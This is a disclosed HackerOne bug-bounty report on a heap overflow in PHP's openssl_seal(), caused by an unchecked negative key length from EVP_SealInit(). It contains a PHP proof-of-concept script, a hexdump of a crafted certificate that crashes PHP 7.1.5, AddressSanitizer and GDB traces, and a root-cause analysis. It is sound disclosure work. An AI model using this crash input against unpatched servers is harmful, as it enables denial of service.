# PHP OpenSSL zif_openssl_seal() heap overflow (wild memcpy)

## Report Details
- **Report ID**: 248609
- **URL**: https://hackerone.com/reports/248609
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-12T09:52:49.310Z
- **Disclosed**: 2019-10-14T04:39:39.400Z

## Reporter
- **Username**: xixabangm4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
### Description:
A wild memcpy is discovered in the openssl package included in stable PHP release. During parsing a PEM certificate in openssl_seal(), an invalid key length is produced after parsing, eskl[0] value is -1 after the call to EVP_SealInit(), subsequently causing a heap overflow via a wild memcpy.

### Impact:
Affects both PHP 5 before 5.6.31 ([ChangeLog](http://php.net/ChangeLog-5.php)) and PHP 7 before 7.1.7 ([ChangeLog](http://php.net/ChangeLog-7.php)).
Resolved PHP [bug report](https://bugs.php.net/bug.php?id=74651), will update the pending CVE.

### Exploitability:
PoC provides immediate DoS of the HTTP server; potential code execution requires setting up a malicious external certificate, depending on the actual exploitability of the wild memcpy. We will update again if we have built a different PoC.

### Repro:
```
<?php 
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];
echo "Input file: ".$file_str."\n";

if(!extension_loaded('openssl')) print "openssl not loaded.\n";

$inputstr = file_get_contents($file_str);
print strlen($inputstr) . " bytes read.\n";

$pub_key_id = openssl_get_publickey($inputstr);
var_dump($pub_key_id);

openssl_seal($inputstr, $sealed, $ekeys, array($pub_key_id, $pub_key_id), 'AES-128-ECB');

var_dump($sealed);	
?>
$ uname -a
Linux CSLB16U 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ ./i686-pc-linux-gnu-php --version
PHP 7.1.5 (cli) (built: May 25 2017 16:35:37) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies

$ xxd -g 1 repro.pem 
00000000: 2d 2d 2d 2d 2d 42 45 47 49 4e 20 43 45 52 54 49  -----BEGIN CERTI
00000010: 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a 4d 49 49 45  FICATE-----.MIIE
00000020: 6f 44 43 43 42 41 6d 67 41 77 49 42 41 67 49 42  oDCCBAmgAwIBAgIB
00000030: 4a 7a 41 4e 42 67 6b 71 68 6b 69 47 39 77 30 42  JzANBgkqhkiG9w0B
00000040: 41 51 51 46 41 44 43 42 6b 44 45 4c 4d 41 6b 47  AQQFADCBkDELMAkG
00000050: 41 31 55 45 46 68 4d 43 55 6b 38 78 0a 45 44 41  A1UEFhMCUk8x.EDA
00000060: 4f 42 67 4e 56 42 41 67 54 42 31 4a 76 62 57 46  OBgNVBAgTB1JvbWF
00000070: 75 61 57 45 78 45 44 41 4f 42 67 4e 56 42 41 63  uaWExEDAOBgNVBAc
00000080: 54 42 30 4e 79 59 57 6c 76 64 6d 45 78 44 7a 41  TB0NyYWlvdmExDzA
00000090: 4e 42 67 4e 56 42 41 6f 54 42 6c 4e 6c 0a 63 6d  NBgNVBAoTBlNl.cm
000000a0: 64 70 64 54 45 54 4d 42 45 47 41 31 55 45 43 78  dpdTETMBEGA1UECx
000000b0: 4d 4b 55 32 56 79 5a 32 6c 31 49 46 4e 53 54 44  MKU2VyZ2l1IFNSTD
000000c0: 45 53 4d 42 41 47 41 31 55 45 41 78 4d 4a 55 32  ESMBAGA1UEAxMJU2
000000d0: 56 79 5a 32 6c 31 49 45 4e 42 4d 53 4d 77 0a 49  VyZ2l1IENBMSMw.I
000000e0: 51 59 4a 4b 6f 5a 49 68 76 63 4e 41 51 6b 42 46  QYJKoZIhvcNAQkBF
000000f0: 68 52 75 58 33 4e 6c 63 6d 64 70 64 55 42 6f 62  hRuX3NlcmdpdUBob
00000100: 33 52 74 59 57 6c 73 4c 6d 4e 76 62 54 41 65 46  3RtYWlsLmNvbTAeF
00000110: 77 30 77 4e 44 41 31 4d 54 51 78 4d 7a 4d 30 0a  w0wNDA1MTQxMzM0.
00000120: 4e 54 5a 61 46 77 30 77 4e 54 41 31 4d 54 51 78  NTZaFw0wNTA1MTQx
00000130: 4d 7a 4d 30 4e 54 5a 61 4d 49 47 61 4d 51 73 77  MzM0NTZaMIGaMQsw
00000140: 43 51 59 44 56 51 51 47 45 77 4a 53 54 7a 45 51  CQYDVQQGEwJSTzEQ
00000150: 4d 41 34 47 41 31 55 45 43 42 4d 48 55 6d 39 74  MA4GA1UECBMHUm9t
00000160: 0a 59 57 35 70 59 54 45 51 4d 41 34 47 41 31 55  .YW5pYTEQMA4GA1U
00000170: 45 42 78 4d 48 51 33 4a 68 61 57 39 32 59 54 45  EBxMHQ3JhaW92YTE
00000180: 54 4d 42 45 47 41 31 55 45 43 68 4d 4b 55 32 56  TMBEGA1UEChMKU2V
00000190: 79 5a 32 6c 31 49 46 4e 53 54 44 45 54 4d 42 45  yZ2l1IFNSTDETMBE
000001a0: 47 0a 41 31 55 45 43 78 4d 4b 55 32 56 79 5a 32  G.A1UECxMKU2VyZ2
000001b0: 6c 31 49 46 4e 53 54 44 45 59 4d 42 59 47 41 31  l1IFNSTDEYMBYGA1
000001c0: 55 45 41 78 4d 50 55 32 56 79 5a 32 6c 31 49 48  UEAxMPU2VyZ2l1IH
000001d0: 42 6c 63 6e 4e 76 62 6d 46 73 4d 53 4d 77 49 51  BlcnNvbmFsMSMwIQ
000001e0: 59 4a 0a 4b 6f 5a 49 68 76 63 4e 41 51 6b 42 46  YJ.KoZIhvcNAQkBF
000001f0: 68 52 75 58 33 4e 6c 63 6d 64 70 64 55 42 6f 62  hRuX3NlcmdpdUBob
00000200: 33 52 74 59 57 6c 73 4c 6d 4e 76 62 54 43 42 6e  3RtYWlsLmNvbTCBn
00000210: 7a 41 4e 42 67 6b 71 68 6b 69 47 39 77 30 42 41  zANBgkqhkiG9w0BA
00000220: 51 45 46 0a 41 41 4f 42 6a 51 41 77 67 59 6b 43  QEF.AAOBjQAwgYkC
00000230: 67 59 45 41 70 4e 6a 37 58 58 7a 38 54 38 46 63  gYEApNj7XXz8T8Fc
00000240: 4c 49 57 70 42 6e 69 50 59 6f 6d 33 51 63 54 36  LIWpBniPYom3QcT6
00000250: 54 37 75 30 78 52 50 48 71 74 71 7a 6a 35 6f 62  T7u0xRPHqtqzj5ob
00000260: 6f 42 59 70 0a 44 4a 65 35 64 33 35 34 2f 79 30  oBYp.DJe5d354/y0
00000270: 67 4a 54 70 69 4c 74 38 2b 66 54 72 50 67 57 58  gJTpiLt8+fTrPgWX
00000280: 6e 62 48 6d 33 70 4f 48 67 58 7a 54 63 58 36 41  nbHm3pOHgXzTcX6A
00000290: 72 61 6e 69 30 47 44 55 30 2f 78 44 69 34 56 6b  rani0GDU0/xDi4Vk
000002a0: 43 52 47 63 53 0a 59 71 58 32 73 4a 70 63 44 7a  CRGcS.YqX2sJpcDz
000002b0: 41 62 6d 4b 39 55 44 4d 74 33 78 66 2f 4f 31 42  AbmK9UDMt3xf/O1B
000002c0: 38 41 4a 61 6e 33 52 66 4f 30 42 6d 33 6f 7a 54  8AJan3RfO0Bm3ozT
000002d0: 45 50 7a 69 4c 4d 6b 6d 73 69 59 72 35 62 2f 4c  EPziLMkmsiYr5b/L
000002e0: 34 43 41 77 45 41 0a 41 61 4f 43 41 66 77 77 67  4CAwEA.AaOCAfwwg
000002f0: 67 48 34 4d 41 6b 47 41 31 55 64 45 77 51 43 4d  gH4MAkGA1UdEwQCM
00000300: 41 41 77 4e 51 59 4a 59 49 5a 49 41 59 62 34 51  AAwNQYJYIZIAYb4Q
00000310: 67 45 4e 42 43 67 57 4a 6b 5a 76 63 69 42 48 63  gENBCgWJkZvciBHc
00000320: 6d 6c 6b 49 48 56 7a 0a 5a 53 42 76 62 6d 78 35  mlkIHVz.ZSBvbmx5
00000330: 4f 79 42 79 5a 58 46 31 5a 58 4e 30 49 48 52 68  OyByZXF1ZXN0IHRh
00000340: 5a 79 42 31 63 32 56 79 56 47 46 6e 4d 42 45 47  ZyB1c2VyVGFnMBEG
00000350: 43 57 43 47 53 41 47 47 2b 45 49 42 41 51 51 45  CWCGSAGG+EIBAQQE
00000360: 41 77 49 46 34 44 41 2f 0a 42 67 4e 56 48 52 38  AwIF4DA/.BgNVHR8
00000370: 45 4f 44 41 32 4d 44 53 67 4d 71 41 77 68 69 35  EODA2MDSgMqAwhi5
00000380: 6f 64 48 52 77 4f 69 38 76 62 57 39 69 61 57 78  odHRwOi8vbW9iaWx
00000390: 6c 4c 6d 4a 73 64 57 55 74 63 32 39 6d 64 48 64  lLmJsdWUtc29mdHd
000003a0: 68 63 6d 55 75 63 6d 38 36 0a 4f 54 41 76 59 32  hcmUucm86.OTAvY2
000003b0: 45 76 59 33 4a 73 4c 6e 4e 6f 64 47 31 73 4d 44  EvY3JsLnNodG1sMD
000003c0: 55 47 43 57 43 47 53 41 47 47 2b 45 49 42 43 41  UGCWCGSAGG+EIBCA
000003d0: 51 6f 46 69 5a 6f 64 48 52 77 4f 69 38 76 62 57  QoFiZodHRwOi8vbW
000003e0: 39 69 61 57 78 6c 4c 6d 4a 73 0a 64 57 55 74 63  9iaWxlLmJs.dWUtc
000003f0: 32 39 6d 64 48 64 68 63 6d 55 75 63 6d 38 36 4f  29mdHdhcmUucm86O
00000400: 54 41 76 63 48 56 69 4c 7a 41 68 42 67 4e 56 48  TAvcHViLzAhBgNVH
00000410: 52 45 45 47 6a 41 59 67 52 5a 7a 5a 58 4a 6e 61  REEGjAYgRZzZXJna
00000420: 58 56 41 59 6d 78 31 5a 58 4e 76 0a 5a 6e 52 33  XVAYmx1ZXNv.ZnR3
00000430: 59 58 4a 6c 4c 6e 4a 76 4d 42 30 47 41 31 55 64  YXJlLnJvMB0GA1Ud
00000440: 44 67 51 57 42 42 53 77 70 2f 2f 35 51 52 58 65  DgQWBBSwp//5QRXe
00000450: 49 7a 6d 39 33 54 45 50 6c 36 43 79 6f 6e 54 67  Izm93TEPl6CyonTg
00000460: 2f 44 43 42 70 77 59 44 56 52 30 6a 0a 42 49 47  /DCBpwYDVR0j.BIG
00000470: 66 4d 49 47 63 6f 59 47 57 70 49 47 54 4d 49 47  fMIGcoYGWpIGTMIG
00000480: 51 4d 51 73 77 43 51 59 44 56 51 51 47 45 77 4a  QMQswCQYDVQQGEwJ
00000490: 53 54 7a 45 51 4d 41 34 47 41 31 55 45 43 42 4d  STzEQMA4GA1UECBM
000004a0: 48 55 6d 39 74 59 57 35 70 59 54 45 51 0a 4d 41  HUm9tYW5pYTEQ.MA
000004b0: 34 47 41 31 55 45 42 78 4d 48 51 33 4a 68 61 57  4GA1UEBxMHQ3JhaW
000004c0: 39 32 59 54 45 50 4d 41 30 47 41 31 55 45 43 68  92YTEPMA0GA1UECh
000004d0: 4d 47 55 32 56 79 5a 32 6c 31 4d 52 4d 77 45 51  MGU2VyZ2l1MRMwEQ
000004e0: 59 44 56 51 51 4c 45 77 70 54 5a 58 4a 6e 0a 61  YDVQQLEwpTZXJn.a
000004f0: 58 55 67 55 31 4a 4d 4d 52 49 77 45 41 59 44 56  XUgU1JMMRIwEAYDV
00000500: 51 51 44 45 77 6c 54 5a 58 4a 6e 61 58 55 67 51  QQDEwlTZXJnaXUgQ
00000510: 30 45 78 49 7a 41 68 42 67 6b 71 68 6b 69 47 39  0ExIzAhBgkqhkiG9
00000520: 77 30 42 43 51 45 57 46 47 35 66 63 32 56 79 0a  w0BCQEWFG5fc2Vy.
00000530: 5a 32 6c 31 51 47 68 76 64 47 31 68 61 57 77 75  Z2l1QGhvdG1haWwu
00000540: 59 32 39 74 67 67 45 41 4d 41 73 47 41 31 55 64  Y29tggEAMAsGA1Ud
00000550: 44 77 51 45 41 77 49 45 38 44 41 6a 42 67 6c 67  DwQEAwIE8DAjBglg
00000560: 68 6b 67 42 68 76 68 43 41 51 49 45 46 68 59 55  hkgBhvhCAQIEFhYU
00000570: 0a 61 48 52 30 63 44 6f 76 4c 7a 59 79 4c 6a 49  .aHR0cDovLzYyLjI
00000580: 7a 4d 53 34 35 4f 43 34 31 4d 69 38 77 43 77 59  zMS45OC41Mi8wCwY
00000590: 44 4b 67 4d 45 42 41 51 2b 35 32 49 30 4d 41 30  DKgMEBAQ+52I0MA0
000005a0: 47 43 53 71 47 53 49 62 33 44 51 45 42 42 41 55  GCSqGSIb3DQEBBAU
000005b0: 41 0a 41 34 47 42 41 49 42 49 4f 4a 2b 69 69 4c  A.A4GBAIBIOJ+iiL
000005c0: 79 51 66 4e 4a 45 59 2b 49 4d 65 66 61 79 51 65  yQfNJEY+IMefayQe
000005d0: 61 30 6e 6d 75 58 59 59 2b 46 2b 4c 31 44 46 6a  a0nmuXYY+F+L1DFj
000005e0: 53 43 37 78 43 68 79 74 67 59 6f 50 4e 6e 4b 6b  SC7xChytgYoPNnKk
000005f0: 68 68 0a 33 64 57 50 74 78 62 73 77 69 71 4b 59  hh.3dWPtxbswiqKY
00000600: 55 6e 47 69 36 79 33 48 69 34 55 68 44 73 4f 61  UnGi6y3Hi4UhDsOa
00000610: 44 57 32 39 74 32 53 33 30 35 68 53 63 32 71 67  DW29t2S305hSc2qg
00000620: 6a 4f 69 4e 74 52 59 51 49 56 59 51 38 45 48 47  jOiNtRYQIVYQ8EHG
00000630: 31 6b 37 0a 46 6c 36 33 53 37 75 43 4f 68 6e 56  1k7.Fl63S7uCOhnV
00000640: 4a 74 2b 34 4d 6e 55 4b 31 4e 36 2f 70 77 67 73  Jt+4MnUK1N6/pwgs
00000650: 70 2b 5a 32 47 76 45 73 44 47 31 71 43 4b 6e 76  p+Z2GvEsDG1qCKnv
00000660: 4e 70 66 36 0a 2d 2d 2d 2d 2d 45 4e 44 20 43 45  Npf6.-----END CE
00000670: 52 54 49 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a     RTIFICATE-----.

$ ./i686-pc-linux-gnu-php openSSLharn.php repro.pem 
Input file: /home/sebastian/Documents/php_gdb/bin/repro.pem
1663 bytes read.
resource(6) of type (OpenSSL key)
=================================================================
==32018==ERROR: AddressSanitizer: negative-size-param: (size=-1)
    #0 0xf71fab04 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ab04)
    #1 0xf71fac2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)
    #2 0x8cdacb6 in zend_string_init /home/sebastian/Documents/php-7.1.5/Zend/zend_string.h:160
    #3 0x8cdacb6 in add_next_index_stringl /home/sebastian/Documents/php-7.1.5/Zend/zend_API.c:1554
    #4 0x81627d2 in zif_openssl_seal /home/sebastian/Documents/php-7.1.5/ext/openssl/openssl.c:5932
    #5 0x8e7a9b5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:628
    #6 0x8e74c59 in execute_ex /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:429
    #7 0x8e766ef in zend_execute /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:474
    #8 0x8cc60bd in zend_execute_scripts /home/sebastian/Documents/php-7.1.5/Zend/zend.c:1476
    #9 0x8b0c6c3 in php_execute_script /home/sebastian/Documents/php-7.1.5/main/main.c:2537
    #10 0x920a0bc in do_cli /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:993
    #11 0x920cbef in main /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:1381
    #12 0xf6a89636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #13 0x806a970  (/home/sebastian/Documents/php_gdb/bin/i686-pc-linux-gnu-php+0x806a970)

AddressSanitizer can not describe address in more detail (wild memory access suspected).
SUMMARY: AddressSanitizer: negative-size-param ??:0 __asan_memcpy
==32018==ABORTING
```
### Analysis:
The bug is due to mistakes in both OpenSSL and PHP:

1) OpenSSL 1.1.0e failed to document correct behavior of the EVP_SealInit() function:

EVP_SealInit() may return -1 when one of the keys has a negative length:

https://github.com/openssl/openssl/blob/9bb6f82958537b9ab5ec8fe44c762f448d4a59d8/crypto/evp/p_seal.c
```
41    for (i = 0; i < npubk; i++) {
42        ekl[i] =
43            EVP_PKEY_encrypt_old(ek[i], key, EVP_CIPHER_CTX_key_length(ctx),
44                                 pubk[i]);
45        if (ekl[i] <= 0)
46            return (-1);
47    }
48    return (npubk);
```
However the official documentation for EVP_SealInit() did not mention -1 as a return value on certain error conditions:
https://www.openssl.org/docs/man1.1.0/crypto/EVP_SealInit.html

2) PHP did not handle -1 as a return value of EVP_SealInit(), and failed to validate whether eksl[i] holds a proper length:

In php-7.1.5/ext/openssl/openssl.c:
```
5930		for (i=0; i<nkeys; i++) {
5931			eks[i][eksl[i]] = '\0';
5932			add_next_index_stringl(ekeys, (const char*)eks[i], eksl[i]);
5933			efree(eks[i]);
5934			eks[i] = NULL;
5935		}
```
The eksl[0] as -1, when passed to add_next_index_stringl(), will trigger the wild memcpy.

A quick fix would be adding checks for both the return value of EVP_SealInit(), and values of eksl[i].

The bug also contains a negative indexing issue at:
`5931            eks[i][eksl[i]] = '\0';`

### In GDB:
```
Breakpoint 1, zif_openssl_seal (execute_data=0xf2e13270, return_value=0xffff9150) at /home/sebastian/Documents/php-7.1.5/ext/openssl/openssl.c:5881
5881		eksl = safe_emalloc(nkeys, sizeof(*eksl), 0);

(gdb) n
5882		eks = safe_emalloc(nkeys, sizeof(*eks), 0);

(gdb) x/10bx eksl
0xf2e6b010:	0x18	0xb0	0xe6	0xf2	0x00	0x00	0x00	0x00
0xf2e6b018:	0x20	0xb0

(gdb) watch eksl[0]
Hardware watchpoint 2: eksl[0]
(gdb) c
Continuing.

Hardware watchpoint 2: eksl[0]

Old value = -219762664
New value = -1
0xf763288d in EVP_SealInit () from /usr/local/lib/libcrypto.so.1.1
(gdb) bt
#0  0xf763288d in EVP_SealInit () from /usr/local/lib/libcrypto.so.1.1
#1  0x08161ec3 in zif_openssl_seal (execute_data=0xf2e13270, return_value=0xffff9150) at /home/sebastian/Documents/php-7.1.5/ext/openssl/openssl.c:5913
#2  0x08e7a9b6 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER () at /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:628
#3  0x08e74c5a in execute_ex (ex=0xf2e13020) at /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:429
#4  0x08e766f0 in zend_execute (op_array=0xf2e68200, return_value=0x0) at /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:474
#5  0x08cc60be in zend_execute_scripts (type=8, retval=0x0, file_count=3) at /home/sebastian/Documents/php-7.1.5/Zend/zend.c:1476
#6  0x08b0c6c4 in php_execute_script (primary_file=0xffffbc10) at /home/sebastian/Documents/php-7.1.5/main/main.c:2537
#7  0x0920a0bd in do_cli (argc=3, argv=0xf4000670) at /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:993
#8  0x0920cbf0 in main (argc=3, argv=0xf4000670) at /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:1381
```
eksl[0] as -1 when passed into add_next_index_stringl() would cause the wild copy:
```
5930                 for (i=0; i<nkeys; i++) {
5931                         eks[i][eksl[i]] = '\0';
5932                         add_next_index_stringl(ekeys, (const char*)eks[i], eksl[i]);
5933                         efree(eks[i]);
5934                         eks[i] = NULL;
5935                 }
```
Continuing.
```
=================================================================
==26054==ERROR: AddressSanitizer: negative-size-param: (size=-1)
    #0 0xf7ae5b04 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ab04)
    #1 0xf7ae5c2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)
    #2 0x8cdacb6 in zend_string_init /home/sebastian/Documents/php-7.1.5/Zend/zend_string.h:160
    #3 0x8cdacb6 in add_next_index_stringl /home/sebastian/Documents/php-7.1.5/Zend/zend_API.c:1554
    #4 0x81627d2 in zif_openssl_seal /home/sebastian/Documents/php-7.1.5/ext/openssl/openssl.c:5932
    #5 0x8e7a9b5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:628
    #6 0x8e74c59 in execute_ex /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:429
    #7 0x8e766ef in zend_execute /home/sebastian/Documents/php-7.1.5/Zend/zend_vm_execute.h:474
    #8 0x8cc60bd in zend_execute_scripts /home/sebastian/Documents/php-7.1.5/Zend/zend.c:1476
    #9 0x8b0c6c3 in php_execute_script /home/sebastian/Documents/php-7.1.5/main/main.c:2537
    #10 0x920a0bc in do_cli /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:993
    #11 0x920cbef in main /home/sebastian/Documents/php-7.1.5/sapi/cli/php_cli.c:1381
    #12 0xf7374636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #13 0x806a970  (/home/sebastian/Documents/php_gdb/bin/i686-pc-linux-gnu-php+0x806a970)

AddressSanitizer can not describe address in more detail (wild memory access suspected).
SUMMARY: AddressSanitizer: negative-size-param ??:0 __asan_memcpy
==26054==ABORTING
```




## Attachments
No attachments
